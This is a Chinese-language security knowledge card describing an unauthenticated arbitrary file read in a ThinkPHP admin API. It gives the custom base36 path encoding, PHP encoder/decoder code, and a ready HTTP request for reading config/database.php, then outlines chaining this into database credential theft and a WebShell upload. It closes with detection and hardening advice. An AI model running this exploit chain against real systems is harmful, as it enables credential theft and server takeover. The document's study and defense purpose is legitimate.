---
id: web-generic-file-inclusion-admin-api-update-read-base36-encode-path
title: 未授权任意文件读取：admin/api.update/read 的 encode 参数按 GBK 字节逐位 base36 编码，逆向 encode 后读 config/database.php 与日志
type: scenario
domain: web
path: web/generic/file-inclusion
technique: custom-base36-encoded-arbitrary-file-read
aliases:
- admin/api.update/read
- encode 参数文件读取
- base36 路径编码
- 未授权读取 database.php
- ThinkPHP 后台 read 接口
- 自定义编码任意文件读取
tags:
- php
- thinkphp
- arbitrary-file-read
- file-read
- unauth
- encoding
- base36
- admin-route
- credential-leak
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V594
  verified_at: '2026-11-12T15:38:42+08:00'
  notes: 已对照原文及全部 38 张截图核对：admin/api.update/tree 未授权返回 data.paths/config 清单（图 24-25）、read($encode) 源码 env('root_path').decode($encode)+file_exists+base64_encode（图 26）、encode 实现 iconv UTF-8→GBK//TRANSLIT + base_convert(ord,10,36)+str_pad 左补两位、encode('config/database.php')=2r33322u2x2v1b2s2p382p2q2p372t1a342w34（38 字符=19 字节，本地验算解码正确）、响应 data.format=base64/content 与图 27 一致；日志中发现 user_recharge 上传接口（图 29-30）属实。tree 接口作为配套上下文写入本卡，未单独成卡（信息价值低，可接受）。未在本机复跑。dedup top 候选（open_basedir bypass、ThinkPHP admin unzip、download 参数读、Jenkins 密码、SeaCMS download）均不同链。
---

## 一句话结论

ThinkPHP 后台路由 `admin/api.update/read` 未做鉴权，直接把 `env('root_path') . decode($encode)` 作为路径读取文件并返回 base64；`encode` 是「GBK 字节逐位 base36、左补 0 到两位」的自定义编码，攻击者拿到编码函数后在本地复现（或直接写解码器）即可构造任意相对路径，读取 `config/database.php` 拿到数据库账号口令、读取运行日志发现隐藏的上传接口，最终取得 WebShell。

## 原理

- **未鉴权的 read 接口**：`admin/api.update/read?encode=<encoded>` 对应的控制器方法 `read($encode)` 只做三件事：`$this->file = env('root_path') . decode($encode)`、`file_exists` 判断、`base64_encode(file_get_contents(...))` 返回。没有登录态/权限校验，也没有对 `decode` 结果做路径白名单或 `../` 过滤。
- **自定义编码**：`encode($string)` 先用 `iconv('UTF-8','GBK//TRANSLIT', $string)` 把路径转成 GBK 字节串，再对每个字节 `ord()` 后转 base36、`str_pad(...,2,'0')` 左补到两位并拼接。即「每 2 个 base36 字符 = 1 个原始字节」。
- **逆推 decode**：每 2 个字符一组，`base_convert(chunk, 36, 10)` 得到字节值，`chr()` 还原字节串，再按 GBK 转 UTF-8 得到原始路径。例如 `config/database.php` 编码后是 `2r33322u2x2v1b2s2p382p2q2p372t1a342w34`（38 个字符 = 19 字节）。
- **为什么能读任意文件**：路径前缀只是站点根目录 `root_path`，编码表本身就能表达 `.`（`1a`）与 `/`（`1b`），因此同目录/上级目录的敏感文件都可读取；响应 `data.format=base64`、`data.content` 为文件全文的 base64。
- **配套的 tree 接口**：`admin/api.update/tree` 同样未鉴权，返回 `data.paths`（如 `config/log.php`、`config/cookie.php`、`config/template.php`、`application/admin` 等）和 `data.list`（文件 hash），为 read 接口提供精确路径，等于先给目录清单再给读文件能力。
- **攻击价值**：`config/database.php` 直接给出数据库类型、hostname、库名、用户名、口令；运行日志（`runtime/log/...`）里能看到完整的请求参数（如包含 `headpic=data:image/...;base64,...` 的 `user_recharge` 请求），据此发现隐藏的上传接口，接上文件上传利用链。

## 触发条件

- 目标为 ThinkPHP（案例 v5/v10 后台命名）应用，`admin/api.update` 等后台 API 路由可在未登录状态访问。
- `read` 方法使用自定义 `encode/decode` 处理路径，且未做 `realpath` 白名单、后缀限制或鉴权。
- Web 进程对目标文件有读权限；`config/database.php`、`runtime` 日志等文件存在。
- 攻击者能获得编码函数源码（代码审计、安装文档、备份文件）或根据请求参数/响应反推编码规则。

## 利用步骤

1. 访问 `/admin.html?s=admin/api.update/tree`，未授权拿到文件树 `data.paths` 与 `data.list`（含 config 配置文件与 admin 应用目录）。
2. 从源码/备份中找到 `encode` 函数，本地 PHP 复现（`iconv` + `base_convert(ord,10,36)` + 两位补零），或直接写解码器反向验证。
3. 用编码函数把目标路径（如 `config/database.php`）编码成 `encode` 参数。
4. 请求 `GET /admin.html?s=admin/api.update/read?encode=<encoded>`；响应 `code=1`、`data.format=base64`、`data.content=<base64>`。
5. 对 `data.content` 做 base64 解码，得到文件全文（案例读出数据库 hostname/database/username/password）。
6. 继续读 `runtime` 下最新日志，从请求参数中发现隐藏的上传/业务接口（案例发现 `user_recharge` 复用 `upload_base64`）。
7. 结合日志中的上传接口写 WebShell，再用上传路径回显或其它方式定位文件（见关联卡）。

## PoC

```php
<?php
// 编码：GBK 字节 → 两位 base36（文章 encode 的等价实现）
function encode_path($string) {
    $content = iconv('UTF-8', 'GBK//TRANSLIT', $string);
    $chars = '';
    for ($i = 0; $i < strlen($content); $i++)
        $chars .= str_pad(base_convert(ord($content[$i]), 10, 36), 2, '0', STR_PAD_LEFT);
    return $chars;
}

// 解码：两位 base36 → 字节 → GBK 转 UTF-8
function decode_path($encoded) {
    $out = '';
    for ($i = 0; $i < strlen($encoded); $i += 2)
        $out .= chr(base_convert(substr($encoded, $i, 2), 36, 10));
    return iconv('GBK', 'UTF-8//IGNORE', $out);
}

echo encode_path('config/database.php');
// 2r33322u2x2v1b2s2p382p2q2p372t1a342w34
```

```http
GET /admin.html?s=admin/api.update/read?encode=2r33322u2x2v1b2s2p382p2q2p372t1a342w34 HTTP/1.1
Host: target
```

```json
{"code":1,"info":"读取文件成功！","data":{"format":"base64","content":"PD9waHANCi8v..."}}
```

```bash
# 解码文件内容
echo '<data.content>' | base64 -d
```

案例读出 `config/database.php` 的数据库连接信息，并从日志发现上传接口；未在本机复跑。路径编码示例已按文章算法本地验算（`config/database.php` 与 38 字符编码一一对应）。

## 变体与关联

- 关联：[[web-php-framework-thinkphp-invokefunction-file-put-contents-webshell]]、[[web-php-framework-thinkphp-5x-invokefunction-captcha-rce]]（同一目标另一种落马方式：invokefunction 写文件；本卡是先读配置/日志再找上传点）。
- 关联：[[web-generic-file-upload-base64-data-uri-subtype-php-webshell]]（日志中发现的上传接口最终以此方式落 PHP）。
- 关联：[[web-generic-file-upload-get-endpoint-returns-upload-path]]（上传后路径泄露的下一步）。
- 变体：编码可以是 base64、hex、逐字符 char-code、URL 编码或自定义映射；核心是先找到编码函数再反推，不要盲猜参数。
- 变体：同类后台 `api.update`/`sync`/`debug` 路由常同时暴露 tree/list/read/write 方法，tree 泄露路径、read 读文件、write 甚至可写文件。
- 边界：接口有鉴权、`decode` 后做 `realpath` 前缀校验、文件不可读或 open_basedir 限制时失败；`iconv` 对非 GBK 字符可能 translit 失真，构造路径时要注意。

## 检测与防御

- **鉴权**：所有 `admin/api.*` 路由统一走登录/权限中间件，禁止未授权访问 tree/read/write。
- **路径安全**：`realpath` 后强制前缀为允许目录，拒绝 `..`、绝对路径与符号链接；只允许读取白名单文件类型/目录。
- **接口收敛**：生产环境移除 update/sync/debug 类接口；不要让接口返回任意文件的 base64 内容。
- **检测**：监控 `admin.html?s=admin/api.update/tree`、`.../read?encode=` 的访问（尤其未登录会话）；异常 base64 大响应；随后出现对 `config/database.php`、`runtime/log` 的读取与数据库连接。
- **响应**：发现数据库口令泄露时立即轮换，排查日志中的后续上传/登录行为，修复后审计后台路由与编码函数。
